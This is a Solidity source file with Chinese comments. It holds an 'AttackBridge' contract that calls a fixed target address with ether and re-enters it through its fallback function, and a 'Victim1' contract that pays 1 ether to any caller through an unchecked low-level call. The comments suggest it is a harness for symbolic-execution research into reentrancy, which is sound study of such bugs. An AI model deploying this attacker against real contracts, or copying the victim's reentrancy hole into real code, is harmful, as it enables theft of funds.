// SPDX-License-Identifier: MIT


contract AttackBridge{
    // uint32 private counter;
    // address private last_caller_addr;
    bytes4 private func_sig;
    bytes32 private call_data_list;
    uint32 private func_sig_re;
    // address private owner;
    uint private flag;
    bytes32 private temp;


    function AttackBridge(uint32 func_sig_, bytes32 a) public {
        func_sig_re = func_sig_;
        temp = a;
        // counter = 0;
        // last_caller_addr = address(0);
        // func_sig_re = func_sig_;
        // owner = msg.sender;
    }
    
    // function set_func_sig(string memory func_sig_) public {
    //     func_sig = func_sig_;
    // }
    // function set_call_addr(address addr_) public {
    //     victim_addr = addr_;
    // }

    // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 
   
    function attack1(uint num_, bytes4 func_sig_,  bytes32 call_data_1) public {
        //string n = "transfer(address)";
        func_sig = func_sig_;
        call_data_list = call_data_1;

        // 开锁
        flag = 1;

        bool sucess = false;
        // sucess = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)( bytes4(sha3(func_sig_)), call_data_1, call_data_1);
        sucess = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(func_sig_, call_data_1, call_data_1);
        if (!sucess){
            //关锁
            // revert();
            throw;
        }
        //关锁
        flag = 0;
    }
    function attack0(uint num_, bytes4 func_sig_) public {
        //string n = "transfer(address)";
        func_sig = func_sig_;
 
        // 开锁
        flag = 1;
        bool sucess = false;
        // sucess = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(bytes4(sha3(func_sig_))) ;
        sucess = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(func_sig_) ;
        if (!sucess){
            //关锁
            // revert();
            throw;
        }
        //关锁
        flag = 0;
    }
    function call_ (address addr_, bytes4 sig) private returns (bool){
        
        bytes32 data;

        if (func_sig_re == 0)  {
            address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(func_sig_re)(sig);
            return true;
        }
        // else if (func_sig_re == 1){
        //     if (addr_.call(sig, call_data_list) ){
        //         return true;
        //     }
        // }
        else{
        // else (func_sig_re == 2){
            // (sucess, data) = address(addr_).call(
            // // abi.encodeWithSignature(sig, call_data_list) );
            // abi.encodeWithSignature(sig, call_data_list,call_data_list) );
            address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(func_sig_re)(sig, temp, temp) ;
            return true;
            
        }
        // else if (func_sig_re == 3){
        //     if (addr_.call(sig, call_data_list, call_data_list, call_data_list) ){
        //         return true;
        //     }
        // }
        // else if (func_sig_re == 4){
        //     if (addr_.call(sig, call_data_list,call_data_list,call_data_list,call_data_list) ){
        //         return true;
        //     }
        // }
        // else {
        //     if (addr_.call(sig, call_data_list,call_data_list,call_data_list,call_data_list,call_data_list) ){
        //         return true;
        //     }
        // }

        return false;
    }
    // function call__(uint num_, string func_sig_, address addr) public {
    //     //string n = "transfer(address)";
    //     func_sig = func_sig_;
 
    //     // 开锁
    //     flag = 1;
    //     bool sucess = false;
    //     sucess = address(addr).call.value(num_)(bytes4(sha3(func_sig_)),01 ) ;
    //     if (!sucess){
    //         //关锁
    //         // revert();
    //         throw;
    //     }
    //     //关锁
    //     flag = 0;
    // }
    function () external returns (bool){
        // init
        // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
        // string memory sig_ = "attacked(uint,address)"; 
        if (flag != 1){
            // revert();
            return true;
        }
        bytes4 sig = func_sig;
       
            // if(counter!=0){ 上面启用了的条件会导致 只找那些 循环调用同一个合约了的情况, 如果用 counter!=0 还会搜集 不同合约间引发的 reentrancy 情况 更复杂.
                // reentrancy call

                    // (bool sucess, bytes memory data) = address(msg.sender).call(
                    // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );
        // bool sucess = call_ (address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F), sig);
        bool sucess = call_ (address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F), sig);
        if (!sucess){
            // revert();
            throw;
        }
        
        // 如果不是连续的同一个函数的调用 那么就结束吧
        
        // TX END, 这使得每次 执行 该函数 都会是新的状态值.
        // counter = 0;
        return true;
    }
}


// contract AttackBridge{
//     uint32 private counter;
//     bytes4 private func_sig;
//     bytes32 private call_data_list;
//     uint private flag;


//     constructor (string memory func_sig_) public {
//     }
   
//     function attack1(uint num_, bytes4 func_sig_,  bytes32 call_data_1) public {
       
//     }
//     function attack0(uint num_, bytes4 func_sig_) public {
//     }
//     function call_ (address addr_, bytes4 sig) private returns (bool){
       
//     }
   
//     fallback () external {
//     }
// }


contract Victim1{
    uint private num;
    address private sender;
    uint private value; 

    function attacked(uint a, address b) public {

        bool sucess = address(msg.sender).call.value(1 ether)("");
        
        if (!sucess){
            throw;
        }

    }
    
    function() external {

    }
}